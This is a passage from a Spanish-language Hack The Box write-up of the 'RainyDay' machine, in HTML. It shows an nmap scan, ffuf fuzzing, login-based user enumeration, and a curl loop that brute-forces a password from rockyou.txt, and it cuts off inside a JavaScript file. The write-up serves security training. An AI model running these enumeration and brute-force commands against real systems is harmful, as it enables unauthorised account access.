@@ -1,0 +1,787 @@
+<!doctype html><html lang="es"><head><title>RainyDay | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego, podemos hacer fuerza bruta a la contraseña de un usuario y ejecutar contenedores. Mediante un contenedor, podemos acceder a una web interna que tiene una API que muestra información sensible al explotar una vulnerabilidad de Type Juggling y provee una función para usar expresiones regulares en archivos, por lo que podemos leer código fuente y la clave secreta de Flask. Luego, podemos falsificar una sesión del usuario jack y descubrir que los contenedores de Docker permiten acceder a información de procesos de la máquina, por lo que podemos leer la clave privada de SSH de este usuario. Después, podemos ejecutar un intérprete de Python personalizado y escapar de la sandbox para obtener una shell como jack_adm. Finalmente, hay una herramienta que genera hashes con bcrypt, y tenemos que abusar de una limitación de bcrypt para extraer la pimienta secreta y romper el hash de root para escalar privilegios"><meta itemprop="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego, podemos hacer fuerza bruta a la contraseña de un usuario y ejecutar contenedores. Mediante un contenedor, podemos acceder a una web interna que tiene una API que muestra información sensible al explotar una vulnerabilidad de Type Juggling y provee una función para usar expresiones regulares en archivos, por lo que podemos leer código fuente y la clave secreta de Flask. Luego, podemos falsificar una sesión del usuario jack y descubrir que los contenedores de Docker permiten acceder a información de procesos de la máquina, por lo que podemos leer la clave privada de SSH de este usuario. Después, podemos ejecutar un intérprete de Python personalizado y escapar de la sandbox para obtener una shell como jack_adm. Finalmente, hay una herramienta que genera hashes con bcrypt, y tenemos que abusar de una limitación de bcrypt para extraer la pimienta secreta y romper el hash de root para escalar privilegios"><meta name="twitter:card" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego, podemos hacer fuerza bruta a la contraseña de un usuario y ejecutar contenedores. Mediante un contenedor, podemos acceder a una web interna que tiene una API que muestra información sensible al explotar una vulnerabilidad de Type Juggling y provee una función para usar expresiones regulares en archivos, por lo que podemos leer código fuente y la clave secreta de Flask. Luego, podemos falsificar una sesión del usuario jack y descubrir que los contenedores de Docker permiten acceder a información de procesos de la máquina, por lo que podemos leer la clave privada de SSH de este usuario. Después, podemos ejecutar un intérprete de Python personalizado y escapar de la sandbox para obtener una shell como jack_adm. Finalmente, hay una herramienta que genera hashes con bcrypt, y tenemos que abusar de una limitación de bcrypt para extraer la pimienta secreta y romper el hash de root para escalar privilegios"><meta name="twitter:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego, podemos hacer fuerza bruta a la contraseña de un usuario y ejecutar contenedores. Mediante un contenedor, podemos acceder a una web interna que tiene una API que muestra información sensible al explotar una vulnerabilidad de Type Juggling y provee una función para usar expresiones regulares en archivos, por lo que podemos leer código fuente y la clave secreta de Flask. Luego, podemos falsificar una sesión del usuario jack y descubrir que los contenedores de Docker permiten acceder a información de procesos de la máquina, por lo que podemos leer la clave privada de SSH de este usuario. Después, podemos ejecutar un intérprete de Python personalizado y escapar de la sandbox para obtener una shell como jack_adm. Finalmente, hay una herramienta que genera hashes con bcrypt, y tenemos que abusar de una limitación de bcrypt para extraer la pimienta secreta y romper el hash de root para escalar privilegios"><meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego, podemos hacer fuerza bruta a la contraseña de un usuario y ejecutar contenedores. Mediante un contenedor, podemos acceder a una web interna que tiene una API que muestra información sensible al explotar una vulnerabilidad de Type Juggling y provee una función para usar expresiones regulares en archivos, por lo que podemos leer código fuente y la clave secreta de Flask. Luego, podemos falsificar una sesión del usuario jack y descubrir que los contenedores de Docker permiten acceder a información de procesos de la máquina, por lo que podemos leer la clave privada de SSH de este usuario. Después, podemos ejecutar un intérprete de Python personalizado y escapar de la sandbox para obtener una shell como jack_adm. Finalmente, hay una herramienta que genera hashes con bcrypt, y tenemos que abusar de una limitación de bcrypt para extraer la pimienta secreta y romper el hash de root para escalar privilegios"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/RainyDay/RainyDay.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/RainyDay/RainyDay.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/RainyDay/RainyDay.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="RainyDay"><meta property="twitter:title" content="RainyDay"><meta property="og:title" content="RainyDay"><meta property="og:url" content="https://7rocky.github.io/htb/rainyday/"><meta itemprop="keywords" content="api,sudo,flask,docker,python,crypto,type-juggling,port-forwarding,file-permissions,sandbox-escape,user-enumeration,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/rainyday/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/rainyday/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/rainyday/&text=RainyDay" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/rainyday/&title=RainyDay" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">RainyDay</h1><time class="mt4 f6 dib tracked" datetime="2023-02-18T00:00:00+01:00">18 / 02 / 2023</time><br><p class="mb4 f6 dib tracked">25 minutos de lectura</p></header><div class="htb-image"><img alt="RainyDay" src="/images/HTB/RainyDay/RainyDay.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/api" title="API">API</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/flask" title="Flask">Flask</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/crypto" title="Criptografía">Criptografía</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/type-juggling" title="<em>Type Juggling</em>"><em>Type Juggling</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/port-forwarding" title="Reenvío de puertos">Reenvío de puertos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sandbox-escape" title="Escapada de <em>sandbox</em>">Escapada de <em>sandbox</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/user-enumeration" title="Enumeración de usuarios">Enumeración de usuarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de <em>hashes</em> de contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-de-usuarios">Enumeración de usuarios</a></li><li><a href="#ataque-de-fuerza-bruta">Ataque de fuerza bruta</a></li><li><a href="#enumeración-de-archivos-de-javascript">Enumeración de archivos de JavaScript</a></li><li><a href="#enumeración-del-contenedor">Enumeración del contenedor</a></li><li><a href="#acceso-al-entorno-de-desarrollo">Acceso al entorno de desarrollo</a></li><li><a href="#enumeración-de-api">Enumeración de API</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#leyendo-archivos-del-servidor">Leyendo archivos del servidor</a></li><li><a href="#acceso-al-contenedor-de-jack">Acceso al contenedor de <code>jack</code></a></li><li><a href="#acceso-mediante-ssh">Acceso mediante SSH</a></li></ul></li><li><a href="#movimiento-lateral-al-usuario-jack_adm">Movimiento lateral al usuario <code>jack_adm</code></a><ul><li><a href="#escape-del-_sandbox_-de-python">Escape del <em>sandbox</em> de Python</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#encontrando-la-pimienta-secreta">Encontrando la pimienta secreta</a></li><li><a href="#rompiendo-el-_hash_-de-root">Rompiendo el <em>hash</em> de <code>root</code></a></li></ul></li><li><a href="#aclaraciones">Aclaraciones</a><ul><li><a href="#_type-juggling_-en-la-api"><em>Type Juggling</em> en la API</a></li><li><a href="#enumeración-de-usuarios-1">Enumeración de usuarios</a></li><li><a href="#inspección-de-procesos-desde-los-contenedores">Inspección de procesos desde los contenedores</a></li><li><a href="#validación-de-la-dirección-ip">Validación de la dirección IP</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Difícil</li><li><strong>Dirección IP</strong>: 10.10.11.184</li><li><strong>Fecha</strong>: 15 / 10 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.184 -p 22,80
+Nmap scan report for 10.10.11.184
+Host is up (0.043s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)
+|_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://rainycloud.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 8.22 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.184</code> se nos redirige a <code>http://rainycloud.htb</code>. Después de agregar el dominio a <code>/etc/hosts</code>, veremos esta página:</p><p><img src="/images/HTB/RainyDay/RainyDay-1.png" alt="RainyDay 1"></p><p>En primer lugar, vamos a enumerar más subdominios usando <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.184 -H <span class="code-dark-yellow">'Host: FUZZ.rainycloud.htb'</span> -fs 229  
+<span class="code-dark-yellow">dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 411ms]</span>
+</code></pre></div><p>Y ahí vemos <code>dev.rainycloud.htb</code>, pero no podemos acceder:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -i dev.rainycloud.htb
+HTTP/1.1 403 FORBIDDEN
+<span class="code-white">Server</span>: nginx/1.18.0 (Ubuntu)
+<span class="code-white">Date</span>:
+<span class="code-white">Content-Type</span>: text/html; charset=utf-8  
+<span class="code-white">Content-Length</span>: 26
+<span class="code-white">Connection</span>: keep-alive
+
+Access Denied - Invalid IP
+</code></pre></div><p>Desde aquí, podemos ver que la tecnología web detrás de nginx es Flask, porque el mensaje de estado de respuesta aparece en letras mayúsculas. Además, no podemos saltarnos la comprobación de la IP usando cabedera del tipo <code>X-Forwarded-For</code>. Por tanto, este es un punto muerto.</p><p>En la página principal, tenemos <code>jack</code> como nombre de usuario. Tendremos que iniciar sesión para utilizar la aplicación web:</p><p><img src="/images/HTB/RainyDay/RainyDay-2.png" alt="RainyDay 2"></p><p>Pero estaría mejor registrarse primero:</p><p><img src="/images/HTB/RainyDay/RainyDay-3.png" alt="RainyDay 3"></p><p>Aunque el registro está cerrado&mldr;</p><p><img src="/images/HTB/RainyDay/RainyDay-4.png" alt="RainyDay 4"></p><h3 id="enumeración-de-usuarios">Enumeración de usuarios</h3><p>Mirando el código HTML de <code>/login</code>, hay un mensaje de depuración que filtra una ruta de código fuente:</p><p><img src="/images/HTB/RainyDay/RainyDay-5.png" alt="RainyDay 5"></p><p>De hecho, <code>288</code> es la línea de código donde el programa falla. Sorprendentemente, si usamos <code>jack</code> como nombre de usuario para iniciar sesión, veremos <code>294</code> en el mensaje de depuración:</p><p><img src="/images/HTB/RainyDay/RainyDay-6.png" alt="RainyDay 6"></p><p>Así que aquí tenemos una forma de enumerar a los usuarios. Usemos <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/names.txt -u http://rainycloud.htb/login -d <span class="code-dark-yellow">'username=FUZZ&password=asdf'</span> -H <span class="code-dark-yellow">'Content-Type: application/x-www-form-urlencoded'</span> -mr 294  
+<span class="code-dark-green">gary                    [Status: 200, Size: 3488, Words: 1270, Lines: 66, Duration: 1351ms]</span>
+<span class="code-dark-green">jack                    [Status: 200, Size: 3488, Words: 1270, Lines: 66, Duration: 490ms]</span>
+<span class="code-dark-green">root                    [Status: 200, Size: 3488, Words: 1270, Lines: 66, Duration: 226ms]</span>
+</code></pre></div><p>Tenemos 3 usuarios disponibles.</p><h3 id="ataque-de-fuerza-bruta">Ataque de fuerza bruta</h3><p>Para tener algo de reconocimiento en segundo plano, pensé que <code>gary</code> tendría una contraseña débil, por lo que usé un ataque de fuerza bruta con las primeras contraseñas de <code>rockyou.txt</code> hasta que encontré un inicio de sesión exitoso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> p in <span class="code-dark-magenta">$(</span><span class="code-dark-green">head</span> -10000 $WORDLISTS/rockyou.txt<span class="code-dark-magenta">)</span>; <span class="code-dark-yellow">do</span> <span class="code-dark-green">curl</span> rainycloud.htb/login -sd <span class="code-dark-yellow">"username=gary&password=<span class="code-dark-cyan">$p</span>"</span> | <span class="code-dark-green">md5sum</span> | <span class="code-dark-green">tr</span> \\n <span class="code-dark-yellow">' '</span>; <span class="code-dark-green">echo</span> $p; <span class="code-dark-yellow">done</span> | <span class="code-dark-green">grep</span> -v 225c68dfe55778812b201bd4cf01fbd5  
+0aff13952610be440befcb31a31a4c3f  - rubberducky
+</code></pre></div><p>Sorprendentemente, después de una hora, encontré que <code>rubberducky</code> era la contraseña de <code>gary</code>.</p><p>Nótese que empleé el <em>hash</em> MD5 de la respuesta para determinar la que fuera exitosa.</p><h3 id="enumeración-de-archivos-de-javascript">Enumeración de archivos de JavaScript</h3><p>Mientras corría el ataque de fuerza bruta, enumeré rutas web y archivos de JavaScript con <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://rainycloud.htb/FUZZ
+<span class="code-dark-green">login                   [Status: 200, Size: 3254, Words: 1158, Lines: 63, Duration: 67ms]</span>
+<span class="code-dark-blue">new                     [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 109ms]</span>
+<span class="code-dark-green">register                [Status: 200, Size: 3686, Words: 1324, Lines: 68, Duration: 67ms]</span>
+<span class="code-dark-blue">logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 53ms]</span>
+<span class="code-dark-green">                        [Status: 200, Size: 4378, Words: 1045, Lines: 110, Duration: 302ms]</span>
+<span class="code-dark-blue">containers              [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 259ms]</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://rainycloud.htb/js/FUZZ.js  
+<span class="code-dark-green">signup                  [Status: 200, Size: 259, Words: 58, Lines: 12, Duration: 59ms]</span>
+<span class="code-dark-green">containers              [Status: 200, Size: 1606, Words: 437, Lines: 51, Duration: 182ms]</span>
+</code></pre></div><p>El único interesante es <code>containers.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">saveBlob</span><span class="mtk1">(</span><span class="mtk9 mtki">blob</span><span class="mtk1">, </span><span class="mtk9 mtki">fileName</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">a</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">document</span><span class="mtk1">.</span><span class="mtk8">createElement</span><span class="mtk1">(</span><span class="mtk4">'a'</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk1">a</span><span class="mtk1">.</span><span class="mtk1">href</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">window</span><span class="mtk1">.</span><span class="mtk7 mtki">URL</span><span class="mtk1">.</span><span class="mtk8">createObjectURL</span><span class="mtk1">(</span><span class="mtk9 mtki">blob</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk1">a</span><span class="mtk1">.</span><span class="mtk1">download</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">fileName</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk1">a</span><span class="mtk1">.</span><span class="mtk8">dispatchEvent</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">MouseEvent</span><span class="mtk1">(</span><span class="mtk4">'click'</span><span class="mtk1">));</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">// RainyCloud-1: TODO - Implement REST API sensibl</span><span class="mtk3">y (this is dumb!)</span>
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">action</span><span class="mtk1">(</span><span class="mtk9 mtki">action_name</span><span class="mtk1">, </span><span class="mtk9 mtki">container_id</span><span class="mtk1">, </span><span class="mtk9 mtki">ctx</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">ctx</span><span class="mtk1">.disabled </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
